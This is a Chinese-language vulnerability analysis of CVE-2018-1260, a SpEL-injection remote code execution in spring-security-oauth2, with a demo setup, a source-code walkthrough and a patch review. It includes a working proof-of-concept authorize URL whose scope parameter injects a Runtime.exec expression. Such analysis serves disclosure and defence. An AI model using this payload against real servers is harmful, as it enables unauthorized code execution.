作者：chybeta  
来源：[先知安全社区](https://xz.aliyun.com/t/2330 "先知安全社区")

#### 漏洞公告

![](https://images.seebug.org/content/images/2018/05/b7cff3c4-b628-4a16-9ac1-19de77205d26.png-w331s)

#### 环境搭建

利用github上已有的demo：

    
    
    git clone https://github.com/wanghongfei/spring-security-oauth2-example.git

确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10

![](https://images.seebug.org/content/images/2018/05/9b055a05-ddf5-41ef-8997-f4c7ad26a81e.png-w331s)

进入spring-security-oauth2-example，修改
cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:

    
    
    @Override
        public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
           clients.inMemory()
                    .withClient("client")
                    .authorizedGrantTypes("authorization_code")
                    .scopes();
        }

根据[spring-security-oauth2-example](https://github.com/wanghongfei/spring-security-oauth2-example "spring-security-oauth2-example")创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。

访问：

    
    
    http://localhost:8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com/chybeta&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D

会重定向到login页面，随意输入username和password，点击login，触发payload。
![](https://images.seebug.org/content/images/2018/05/48b834d8-ad85-49df-bf3e-1b6253d546d6.gif-w331s)

#### 漏洞分析

先简要补充一下关于OAuth2.0的相关知识。

![](https://images.seebug.org/content/images/2018/05/64503ff8-5e3b-4a0d-b403-4d25b9b79ba1.png-w331s)

以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access
token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。

在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization
code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client
credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数scope，这个参数用于表示客户端申请的权限的范围。

根据[官方文档](http://projects.spring.io/spring-security-oauth/docs/oauth2.html
"官方文档")，在spring-security-oauth的默认配置中scope参数默认为空：

    
    
    scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.

为明白起见，我们在demo中将其清楚写出：

    
    
    clients.inMemory()
            .withClient("client")
            .authorizedGrantTypes("authorization_code")
            .scopes();

接着开始正式分析。当我们访问`http://localhost:8080/oauth/authorize`重定向至`http://localhost:8080/login`并完成login后程序流程到达
org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：

    
    
    @RequestMapping(value = "/oauth/authorize")
    public ModelAndView authorize(Map<String, Object> model, @RequestParam Map<String, String> parameters,
            SessionStatus sessionStatus, Principal principal) {
    
        // Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should
        // query off of the authorization request instead of referring back to the parameters map. The contents of the
        // parameters map will be stored without change in the AuthorizationRequest object once it is created.
        AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters);
    
        try {
            ...
            // We intentionally only validate the parameters requested by the client (ignoring any data that may have
            // been added to the request by the manager).
            oauth2RequestValidator.validateScope(authorizationRequest, client);
            ...
    
            // Place auth request into the model so that it is stored in the session
            // for approveOrDeny to use. That way we make sure that auth request comes from the session,
            // so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session.
            model.put("authorizationRequest", authorizationRequest);
    
            return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);
    
        }
        ...

第115行

![](https://images.seebug.org/content/images/2018/05/1e0973cd-189c-462b-81f0-4611244779c3.png-w331s)

在执行完`AuthorizationRequest authorizationRequest =
...`后，`authorizationRequest`代表了要认证的请求，其中包含了众多参数

![](https://images.seebug.org/content/images/2018/05/9955f879-2ebf-405b-8933-004ce1c6e501.png-w331s)

在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：

    
    
    // We intentionally only validate the parameters requested by the client (ignoring any data that may have
    // been added to the request by the manager).
    oauth2RequestValidator.validateScope(authorizationRequest, client);

在这里将对`scope`参数进行验证。跟入`validateScope`到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19

    
    
    public class DefaultOAuth2RequestValidator implements OAuth2RequestValidator {
    
        public void validateScope(AuthorizationRequest authorizationRequest, ClientDetails client) throws InvalidScopeException {
            validateScope(authorizationRequest.getScope(), client.getScope());
        }
        ...
    }

继续跟入`validateScope`，至
org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28

    
    
    private void validateScope(Set<String> requestScopes, Set<String> clientScopes) {
    
            if (clientScopes != null && !clientScopes.isEmpty()) {
                for (String scope : requestScopes) {
                    if (!clientScopes.contains(scope)) {
                        throw new InvalidScopeException("Invalid scope: " + scope, clientScopes);
                    }
                }
            }
    
            if (requestScopes.isEmpty()) {
                throw new InvalidScopeException("Empty scope (either the client or the user is not allowed the requested scopes)");
            }
        }

首先检查`clientScopes`，这个`clientScopes`即我们在前面configure中配置的`.scopes();`，倘若不为空，则进行白名单检查。举个例子，如果前面配置`.scopes("chybeta");`，则传入`requestScopes`必须为`chybeta`，否则会直接抛出异常`Invalid
scope:xxx`。但由于此处查`clientScopes`为空值，则接下来仅仅做了`requestScopes.isEmpty()`的检查并且通过。

在完成了各项检查和配置后，在`authorize`函数的最后执行：

    
    
    return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);

回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入`getUserApprovalPageResponse`
至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：

![](https://images.seebug.org/content/images/2018/05/28119f99-58a4-4e9f-9786-ce0622214799.png-w331s)

生成对应的model和view，之后将会forward到`/oauth/confirm_access`。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20

    
    
    public class WhitelabelApprovalEndpoint {
    
        @RequestMapping("/oauth/confirm_access")
        public ModelAndView getAccessConfirmation(Map<String, Object> model, HttpServletRequest request) throws Exception {
            String template = createTemplate(model, request);
            if (request.getAttribute("_csrf") != null) {
                model.put("_csrf", request.getAttribute("_csrf"));
            }
            return new ModelAndView(new SpelView(template), model);
        }
        ...
    }

跟入`createTemplate`，第29行：

    
    
    protected String createTemplate(Map<String, Object> model, HttpServletRequest request) {
        String template = TEMPLATE;
        if (model.containsKey("scopes") || request.getAttribute("scopes") != null) {
            template = template.replace("%scopes%", createScopes(model, request)).replace("%denial%", "");
        }
        ...
        return template;
    }

跟入`createScopes`，第46行：

![](https://images.seebug.org/content/images/2018/05/45c30086-ae2f-4b62-a356-84a3372e9292.png-w331s)

这里获取到了`scopes`，并且通过for循环生成对应的`builder`，其实就是html和一些标签等，最后返回的即`builder.toString()`,其值如下:

    
    
    <ul><li><div class='form-group'>scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}: <input type='radio' name='scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}' value='true'>Approve</input> <input type='radio' name='scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}' value='false' checked>Deny</input></div></li></ul>

`createScopes`结束后将会把上述`builder.toString()`拼接到`template`中。`createTemplate`结束后，在`getAccessConfirmation`的最后：

    
    
    return new ModelAndView(new SpelView(template), model);

根据`template`生成对应的`SpelView`对象，这是其构造函数：

![](https://images.seebug.org/content/images/2018/05/9bb189e1-b500-4d1c-b829-0e9e9fd588b1.png-w331s)

此后在页面渲染的过程中，将会执行页面中的Spel表达式`${T(java.lang.Runtime).getRuntime().exec("calc.exe")}`从而造成代码执行。

![](https://images.seebug.org/content/images/2018/05/7400a8ba-e2e5-42c1-b0d5-fed8fdd7c59c.png-w331s)

所以综上所述，这个任意代码执行的利用条件实在“苛刻”：

1.需要`scopes`没有配置白名单，否则直接`Invalid scope:xxx`。不过大部分OAuth都会限制授权的范围，即指定scopes。
![](https://images.seebug.org/content/images/2018/05/b9c37014-0549-4708-a4dd-fc7c5a3367f9.png-w331s) 2.使用了默认的Approval
Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。
3.角色是授权服务器（例如@EnableAuthorizationServer）

#### 补丁浅析

commit记录： <https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c>

官方将`SpelView`去除，使用其他方法来生成对应的视图

![](https://images.seebug.org/content/images/2018/05/ac752834-c06a-4297-af9e-a33d482c090c.png-w331s)

#### 资料

  * [CVE-2018-1260: Remote Code Execution with spring-security-oauth2](https://pivotal.io/security/cve-2018-1260 "CVE-2018-1260: Remote Code Execution with spring-security-oauth2")
  * [spring-security-oauth:Authorization Server Configuration](http://projects.spring.io/spring-security-oauth/docs/oauth2.html#Configuring%20Client%20Details "spring-security-oauth:Authorization Server Configuration")
  * [阮一峰:理解OAuth 2.0](http://www.ruanyifeng.com/ "阮一峰:理解OAuth 2.0")

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/597/>

